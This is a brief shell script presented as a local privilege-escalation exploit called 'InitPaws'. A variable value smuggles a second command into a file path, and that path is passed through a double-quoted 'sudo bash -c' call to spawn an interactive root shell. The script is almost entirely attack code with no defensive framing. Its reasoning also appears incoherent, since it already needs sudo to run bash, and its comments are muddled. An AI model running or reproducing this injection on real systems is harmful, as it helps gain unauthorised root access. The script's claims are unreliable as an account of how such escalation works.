# InitPaws - Local Privilege Escalation via Double Quoted sudo /bin/bash -c call

# History expansion breaks the script, so it needs to leave
set +H

# Invoke a (root) shell via init
init_script='/tmp/dummy; /bin/bash < /dev/tty > /dev/tty 2>&1; #'

# Launch the (root) shell
sudo bash -c "echo '#!/bin/bash' > ${init_script}"
